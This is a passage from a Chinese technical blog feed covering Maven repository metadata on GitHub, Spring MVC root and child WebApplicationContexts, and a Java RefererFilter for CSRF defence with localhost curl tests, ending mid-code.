<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">metadata</span> <span class="attr">modelVersion</span>=<span class="string">"1.1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.hengyunabc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-ehcache-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">versioning</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">snapshot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">timestamp</span>&gt;</span>20150804.095005<span class="tag">&lt;/<span class="name">timestamp</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">buildNumber</span>&gt;</span>1<span class="tag">&lt;/<span class="name">buildNumber</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">snapshot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastUpdated</span>&gt;</span>20150804095005<span class="tag">&lt;/<span class="name">lastUpdated</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">versioning</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">metadata</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中md5, sha1校验文件是用来保证这个meta文件的完整性。</p>
<p>maven在编绎项目时，会先尝试请求maven-metadata.xml，如果没有找到，则会直接尝试请求到jar文件，在下载jar文件时也会尝试下载jar的md5, sha1文件。</p>
<p>maven-metadata.xml文件很重要，如果没有这个文件来指明最新的jar版本，那么即使远程仓库里的jar更新了版本，本地maven编绎时用上-U参数，也不会拉取到最新的jar！</p>
<p>所以并不能简单地把jar包放到github上就完事了，一定要先在本地Deploy，生成maven-metadata.xml文件，并上传到github上。</p>
<p>参考：<a href="http://maven.apache.org/ref/3.2.2/maven-repository-metadata/repository-metadata.html" target="_blank" rel="noopener">http://maven.apache.org/ref/3.2.2/maven-repository-metadata/repository-metadata.html</a></p>
<h2 id="maven的仓库关系"><a href="#maven的仓库关系" class="headerlink" title="maven的仓库关系"></a>maven的仓库关系</h2><p><a href="https://maven.apache.org/repository/index.html" target="_blank" rel="noopener">https://maven.apache.org/repository/index.html</a></p>
<p><img src="/img/maven-repositories.png" alt="maven-repositories.png"></p>
<h2 id="配置使用本地仓库"><a href="#配置使用本地仓库" class="headerlink" title="配置使用本地仓库"></a>配置使用本地仓库</h2><p>想要使用本地file仓库里，在项目的pom.xml里配置，如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>hengyunabc-maven-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>file:/home/hengyunabc/code/maven-repo/repository/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>maven的repository并没有优先级的配置，也不能单独为某些依赖配置repository。所以如果项目配置了多个repository，在首次编绎时，会依次尝试下载依赖。如果没有找到，尝试下一个，整个流程会很长。</p>
<p>所以尽量多个依赖放同一个仓库，不要每个项目都有一个自己的仓库。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://stackoverflow.com/questions/14013644/hosting-a-maven-repository-on-github/14013645#14013645" target="_blank" rel="noopener">http://stackoverflow.com/questions/14013644/hosting-a-maven-repository-on-github/14013645#14013645</a><br><a href="http://cemerick.com/2010/08/24/hosting-maven-repos-on-github/" target="_blank" rel="noopener">http://cemerick.com/2010/08/24/hosting-maven-repos-on-github/</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>github</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>扯谈spring mvc之WebApplicationContext的继承关系</title>
    <url>/something-about-spring-mvc-webapplicationcontext/</url>
    <content><![CDATA[<h2 id="spring-mvc里的root-child-WebApplicationContext的继承关系"><a href="#spring-mvc里的root-child-WebApplicationContext的继承关系" class="headerlink" title="spring mvc里的root/child WebApplicationContext的继承关系"></a>spring mvc里的root/child WebApplicationContext的继承关系</h2><p>在传统的spring mvc程序里会有两个<code>WebApplicationContext</code>，一个是parent，从<code>applicationContext.xml</code>里加载的，一个是child，从<code>servlet-context.xml</code>里加载的。<br>两者是继承关系，child WebApplicationContext 可以通过<code>getParent()</code>函数获取到root WebApplicationContext。</p>
<p>简单地说child WebApplicationContext里的bean可以注入root WebApplicationContext里的bean，而parent WebApplicationContext的bean则不能注入chile WebApplicationContext里的bean。</p>
<p>一个典型的web.xml的内容是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath*:/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Processes application requests --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>appServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/servlet-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>appServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中root WebApplicationContext是通过listener初始化的，child WebApplicationContext是通过servlet初始化的。</p>
<p>而在<code>applicationContext.xml</code>里通常只component-scan非Controller的类，如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"io.github.test"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Controller"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">type</span>=<span class="string">"annotation"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">expression</span>=<span class="string">"org.springframework.web.bind.annotation.ControllerAdvice"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在<code>servlet-context.xml</code>里通常只component-scan Controller类，如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"io.github.test.web"</span> <span class="attr">use-default-filters</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Controller"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">type</span>=<span class="string">"annotation"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">expression</span>=<span class="string">"org.springframework.web.bind.annotation.ControllerAdvice"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不这样子分别component-scan的话，可能会出现Bean重复初始化的问题。</p>
<p>上面是Spring官方开始时推荐的做法。</p>
<h2 id="root-child-WebApplicationContext继承关系带来的麻烦"><a href="#root-child-WebApplicationContext继承关系带来的麻烦" class="headerlink" title="root/child WebApplicationContext继承关系带来的麻烦"></a>root/child WebApplicationContext继承关系带来的麻烦</h2><p>root WebApplicationContext里的bean可以在不同的child WebApplicationContext里共享，而不同的child WebApplicationContext里的bean区不干扰，这个本来是个很好的设计。</p>
<p>但是实际上有会不少的问题：</p>
<ul>
<li>不少开发者不知道Spring mvc里分有两个WebApplicationContext，导致各种重复构造bean，各种bean无法注入的问题。</li>
<li>有一些bean，比如全局的aop处理的类，如果先root WebApplicationContext里初始化了，那么child WebApplicationContext里的初始化的bean就没有处理到。如果在chile WebApplicationContext里初始化，在root WebApplicationContext里的类就没有办法注入了。</li>
<li>区分哪些bean放在root/child很麻烦，不小心容易搞错，而且费心思。</li>
</ul>
<h2 id="一劳永逸的解决办法：bean都由root-WebApplicationContext加载"><a href="#一劳永逸的解决办法：bean都由root-WebApplicationContext加载" class="headerlink" title="一劳永逸的解决办法：bean都由root WebApplicationContext加载"></a>一劳永逸的解决办法：bean都由root WebApplicationContext加载</h2><p>在一次配置<a href="https://github.com/ryantenney/metrics-spring" target="_blank" rel="noopener">metrics-spring</a>时，对配置<code>@EnableMetrics</code>配置在哪个WebApplicationContext里，感到很蛋疼。最终决定试下把所有的bean，包括Controller都移到root WebApplicationContext，即<code>applicationContext.xml</code>里加载，而<code>servlet-context.xml</code>里基本是空的。结果发现程序运行完全没问题。</p>
<p>后面在网上搜索了下，发现有一些相关的讨论：</p>
<p><a href="http://forum.spring.io/forum/spring-projects/container/89149-servlet-context-vs-application-context" target="_blank" rel="noopener">http://forum.spring.io/forum/spring-projects/container/89149-servlet-context-vs-application-context</a></p>
<h2 id="spring-boot里的做法"><a href="#spring-boot里的做法" class="headerlink" title="spring boot里的做法"></a>spring boot里的做法</h2><p>在spring boot里默认情况下不需要component-scan的配置，于是猜测在Spring boot里是不是只有一个WebApplicationContext？</p>
<p>后面测试下了，发现在spring boot里默认情况下的确是只有一个WebApplicationContext：</p>
<p><code>org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext</code>，</p>
<p>所以在spring boot里省事了很多。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>spring 的ApplicationContext继承机制是一个很好的设计，在很多其它地方都可以看到类似的思路，比如Java的class loader。但是在大部分spring web程序里，实际上只要一个WebApplicationContext就够了。如果分开rott/child WebApplicationContext会导致混乱，而没什么用。</p>
<p>所以推荐把所有的Service/Controller都移到root WebApplicationContext中初始化。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>springmvc</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样写一个RefererFilter</title>
    <url>/how-to-create-a-referer-filter/</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>首先，用检查Referer的方式来防披御CSRF并不是很好的方法。因项目临时有需要，所以做为过渡方案。</p>
<p>为什么判断referer不是很好的办法？</p>
<ul>
<li>referer 可能为空<ul>
<li>https跳转http没有referer</li>
<li>https跳转不同的域名的https没有referer</li>
<li>通过特殊构造的POST请求没有referer</li>
<li>一些的proxy会把referer去掉</li>
<li>用户直接在浏览器里访问（GET请求）</li>
</ul>
</li>
</ul>
<ul>
<li>判断的逻辑复杂（用正则匹配？）</li>
<li>友站中招，殃及池鱼</li>
<li>可以作为过渡方案，非长久之计</li>
</ul>
<p>构造空referer请求的一些参考资料</p>
<ul>
<li><a href="http://blog.kotowicz.net/2011/10/stripping-referrer-for-fun-and-profit.html" target="_blank" rel="noopener">Stripping Referrer for fun and profit</a></li>
<li><a href="http://webstersprodigy.net/2013/02/01/stripping-the-referer-in-a-cross-domain-post-request/" target="_blank" rel="noopener">Stripping the Referer in a Cross Domain POST request</a></li>
</ul>
<p>防御CSRF目前比较好的办法是CSRF Token，参考另一篇blog：<a href="/cookie-and-session-and-csrf">Cookie &amp; Session &amp; CSRF</a>。</p>
<h2 id="收集资料"><a href="#收集资料" class="headerlink" title="收集资料"></a>收集资料</h2><p>先搜索下前人有没有这类相关的工作。<br>搜索到的关于RefererFilter的信息并不多。</p>
<p>不过这里学到了一些东东：<br><a href="https://svn.apache.org/repos/asf/sling/tags/org.apache.sling.security-1.0.0/src/main/java/org/apache/sling/security/impl/ReferrerFilter.java" target="_blank" rel="noopener">https://svn.apache.org/repos/asf/sling/tags/org.apache.sling.security-1.0.0/src/main/java/org/apache/sling/security/impl/ReferrerFilter.java</a></p>
<ul>
<li>是否允许localhost, 127.0.0.1这样referer的请求？</li>
<li>是否允许本地的IP/host的请求？</li>
</ul>
<p>再搜索下java里提取request的referer的方法，还有filter里重定向请求的方法。</p>
<p>再仔细看了下OWASP的文档：</p>
<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</a></p>
<h2 id="确定方案"><a href="#确定方案" class="headerlink" title="确定方案"></a>确定方案</h2><ul>
<li>默认拦截“POST|PUT|DELETE|CONNECT|PATCH”的请求</li>
<li>HttpServletRequest里提取到referer</li>
<li>用java.net.URL来提取referer里的host</li>
<li>判断host是否符合要求，支持完全匹配的域名和子域名</li>
<li>不符合要求的请求回应403或者重定向到指定的页面</li>
</ul>
<p>为什么不用正则的方式来处理referer？</p>
<ul>
<li>正则表达式通常比较慢</li>
<li>很难判断一个复杂的正则表达式是否真的正确</li>
<li>URL是很复杂的，不要手动处理URL，参考<a href="http://en.wikipedia.org/wiki/URI_scheme#Generic_syntax" target="_blank" rel="noopener">URL的语法</a></li>
</ul>
<h2 id="思考需要提供的配置项"><a href="#思考需要提供的配置项" class="headerlink" title="思考需要提供的配置项"></a>思考需要提供的配置项</h2><p>实际最终提供了这些配置项，考虑到像host这样的配置不是经常变动的，所以没有提供从外部配置文件加载配置的功能。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">matchMethods   即拦截的方法，默认值&quot;POST|PUT|DELETE|CONNECT|PATCH&quot;，通常不用配置</span><br><span class="line">allowSubDomainHosts 匹配子域名，以&quot;|&quot;分隔，如&quot;test.com|abc.com&quot;，</span><br><span class="line">                     则http://test.com, http://xxx.test.com这样的请求都会匹配到，推荐优先使用这个配置</span><br><span class="line">completeMatchHosts 完全匹配的域名，以&quot;|&quot;分隔，如&quot;test.com|abc.com&quot;，则只有http://test.com 这样的请求会匹配</span><br><span class="line">                    像http://www.test.com 这样的请求不会被匹配</span><br><span class="line">     </span><br><span class="line">responseError  被拦截的请求的response的返回值，默认是403</span><br><span class="line">redirectPath   被拦截的请求重定向到的url，如果配置了这个值，则会忽略responseError的配置。</span><br><span class="line">                    比如可以配置重定向到自己定义的错误页： /referer_error.html</span><br><span class="line">bAllowEmptyReferer  是否允许空referer，默认是false，除非很清楚，否则不要改动这个</span><br><span class="line">bAllowLocalhost   是否允许localhost, 127.0.0.1 这样的referer的请求，默认是true，便于调试</span><br><span class="line">bAllowAllIPAndHost  是否允许本机的所有IP和host的referer请求，默认是false</span><br></pre></td></tr></table></figure></p>
<h2 id="编码的细节"><a href="#编码的细节" class="headerlink" title="编码的细节"></a>编码的细节</h2><ul>
<li><p>重定向时，注意加上contextPath</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(request.getContextPath() + redirectPath);</span><br></pre></td></tr></table></figure>
<ul>
<li>构造URL时，非法的URL会抛出RuntimeException，需要处理</li>
</ul>
</li>
</ul>
<h2 id="正确地处理URL"><a href="#正确地处理URL" class="headerlink" title="正确地处理URL"></a>正确地处理URL</h2><p>感觉这个有必要再次说明下：</p>
<p><a href="http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html</a></p>
<p>用contain, indexOf, endWitch这些函数时都要小心。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">       URL aURL = <span class="keyword">new</span> URL(<span class="string">"http://example.com:80/docs/books/tutorial"</span></span><br><span class="line">                          + <span class="string">"/index.html?name=networking#DOWNLOADING"</span>);</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">"protocol = "</span> + aURL.getProtocol());</span><br><span class="line">       System.out.println(<span class="string">"authority = "</span> + aURL.getAuthority());</span><br><span class="line">       System.out.println(<span class="string">"host = "</span> + aURL.getHost());</span><br><span class="line">       System.out.println(<span class="string">"port = "</span> + aURL.getPort());</span><br><span class="line">       System.out.println(<span class="string">"path = "</span> + aURL.getPath());</span><br><span class="line">       System.out.println(<span class="string">"query = "</span> + aURL.getQuery());</span><br><span class="line">       System.out.println(<span class="string">"filename = "</span> + aURL.getFile());</span><br><span class="line">       System.out.println(<span class="string">"ref = "</span> + aURL.getRef());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h2 id="用curl来测试"><a href="#用curl来测试" class="headerlink" title="用curl来测试"></a>用curl来测试</h2><p>最后用curl来做了一些测试：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl  --header &quot;Referer:http://test.com&quot; http://localhost:8080/filter-test/referer</span><br><span class="line">curl -X POST --header &quot;Referer:http://test.com&quot; http://localhost:8080/filter-test/referer</span><br><span class="line">curl -X POST --header &quot;Referer:xxxxx&quot; http://localhost:8080/filter-test/referer</span><br><span class="line">curl -X POST http://localhost:8080/filter-test/referer</span><br><span class="line">curl -X POST --header &quot;Referer:http://abc.test.com&quot; http://localhost:8080/filter-test/referer</span><br><span class="line">curl -X POST --header &quot;Referer:http://abc.hello.com.test.com&quot; http://localhost:8080/filter-test/referer</span><br></pre></td></tr></table></figure></p>
<h2 id="实现的代码"><a href="#实现的代码" class="headerlink" title="实现的代码"></a>实现的代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * 支持的配置项：</span></span><br><span class="line"><span class="comment"> * matchMethods   即拦截的方法，默认值"POST|PUT|DELETE|CONNECT|PATCH"，通常不用配置</span></span><br><span class="line"><span class="comment"> * allowSubDomainHosts 匹配子域名，以"|"分隔，如"test.com|abc.com"，</span></span><br><span class="line"><span class="comment"> *                     则http://test.com, http://xxx.test.com这样的请求都会匹配到，推荐优先使用这个配置</span></span><br><span class="line"><span class="comment"> * completeMatchHosts 完全匹配的域名，以"|"分隔，如"test.com|abc.com"，则只有http://test.com 这样的请求会匹配</span></span><br><span class="line"><span class="comment"> *                    像http://www.test.com 这样的请求不会被匹配</span></span><br><span class="line"><span class="comment"> *     </span></span><br><span class="line"><span class="comment"> * responseError  被拦截的请求的response的返回值，默认是403</span></span><br><span class="line"><span class="comment"> * redirectPath   被拦截的请求重定向到的url，如果配置了这个值，则会忽略responseError的配置。</span></span><br><span class="line"><span class="comment"> *                    比如可以配置重定向到自己定义的错误页： /referer_error.html</span></span><br><span class="line"><span class="comment"> * bAllowEmptyReferer  是否允许空referer，默认是false，除非很清楚，否则不要改动这个</span></span><br><span class="line"><span class="comment"> * bAllowLocalhost   是否允许localhost, 127.0.0.1 这样的referer的请求，默认是true，便于调试</span></span><br><span class="line"><span class="comment"> * bAllowAllIPAndHost  是否允许本机的所有IP和host的referer请求，默认是false</span></span><br><span class="line"><span class="comment"> *    </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment"> * 	&lt;filter&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;filter-name&gt;refererFilter&lt;/filter-name&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;filter-class&gt;com.test.RefererFilter&lt;/filter-class&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;init-param&gt;</span></span><br><span class="line"><span class="comment"> * 			&lt;param-name&gt;completeMatchHosts&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment"> * 			&lt;param-value&gt;test.com|abc.com&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;/init-param&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;init-param&gt;</span></span><br><span class="line"><span class="comment"> * 			&lt;param-name&gt;allowSubDomainHosts&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment"> * 			&lt;param-value&gt;hello.com|xxx.yyy.com&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;/init-param&gt;</span></span><br><span class="line"><span class="comment"> * 	&lt;/filter&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 	&lt;filter-mapping&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;filter-name&gt;refererFilter&lt;/filter-name&gt;</span></span><br><span class="line"><span class="comment"> * 		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment"> * 	&lt;/filter-mapping&gt;</span></span><br><span class="line"><span class="comment"> * 	&#125;</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> hengyunabc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefererFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(RefererFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_MATHMETHODS = <span class="string">"POST|PUT|DELETE|CONNECT|PATCH"</span>;</span><br><span class="line"> </span><br><span class="line">	List&lt;String&gt; mathMethods = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">boolean</span> bAllowEmptyReferer = <span class="keyword">false</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">boolean</span> bAllowLocalhost = <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">boolean</span> bAllowAllIPAndHost = <span class="keyword">false</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * when bAllowSubDomain is true, allowHosts is "test.com", then</span></span><br><span class="line"><span class="comment">	 * "www.test.com", "xxx.test.com" will be allow.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">boolean</span> bAllowSubDomain = <span class="keyword">false</span>;</span><br><span class="line"> </span><br><span class="line">	String redirectPath = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">int</span> responseError = HttpServletResponse.SC_FORBIDDEN;</span><br><span class="line"> </span><br><span class="line">	HashSet&lt;String&gt; completeMatchHosts = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line"> </span><br><span class="line">	List&lt;String&gt; allowSubDomainHostList = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"> </span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">		mathMethods.addAll(getSplitStringList(filterConfig, <span class="string">"matchMethods"</span>, <span class="string">"\\|"</span>, DEFAULT_MATHMETHODS));</span><br><span class="line"> </span><br><span class="line">		completeMatchHosts.addAll(getSplitStringList(filterConfig, <span class="string">"completeMatchHosts"</span>, <span class="string">"\\|"</span>, <span class="string">""</span>));</span><br><span class="line"> </span><br><span class="line">		List&lt;String&gt; allowSubDomainHosts = getSplitStringList(filterConfig, <span class="string">"allowSubDomainHosts"</span>, <span class="string">"\\|"</span>, <span class="string">""</span>);</span><br><span class="line">		completeMatchHosts.addAll(allowSubDomainHosts);</span><br><span class="line">		<span class="keyword">for</span> (String host : allowSubDomainHosts) &#123;</span><br><span class="line">			<span class="comment">// check the first char if is '.'</span></span><br><span class="line">			<span class="keyword">if</span> (!host.isEmpty() &amp;&amp; host.charAt(<span class="number">0</span>) != <span class="string">'.'</span>) &#123;</span><br><span class="line">				allowSubDomainHostList.add(<span class="string">"."</span> + host);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				allowSubDomainHostList.add(host);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		responseError = getInt(filterConfig, <span class="string">"responseError"</span>, responseError);</span><br><span class="line">		redirectPath = filterConfig.getInitParameter(<span class="string">"redirectPath"</span>);</span><br><span class="line"> </span><br><span class="line">		bAllowEmptyReferer = getBoolean(filterConfig, <span class="string">"bAllowEmptyReferer"</span>, bAllowEmptyReferer);</span><br><span class="line"> </span><br><span class="line">		bAllowLocalhost = getBoolean(filterConfig, <span class="string">"bAllowLocalhost"</span>, bAllowLocalhost);</span><br><span class="line">		<span class="keyword">if</span> (bAllowLocalhost) &#123;</span><br><span class="line">			completeMatchHosts.add(<span class="string">"localhost"</span>);</span><br><span class="line">			completeMatchHosts.add(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">			completeMatchHosts.add(<span class="string">"[::1]"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		bAllowAllIPAndHost = getBoolean(filterConfig, <span class="string">"bAllowAllIPAndHost"</span>, bAllowAllIPAndHost);</span><br><span class="line">		<span class="keyword">if</span> (bAllowAllIPAndHost) &#123;</span><br><span class="line">			completeMatchHosts.addAll(getAllIPAndHost());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">			ServletException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (servletRequest <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; servletResponse <span class="keyword">instanceof</span> HttpServletResponse) &#123;</span><br><span class="line">			HttpServletRequest request = (HttpServletRequest) servletRequest;</span><br><span class="line">			HttpServletResponse response = (HttpServletResponse) servletResponse;</span><br><span class="line"> </span><br><span class="line">			String method = request.getMethod();</span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 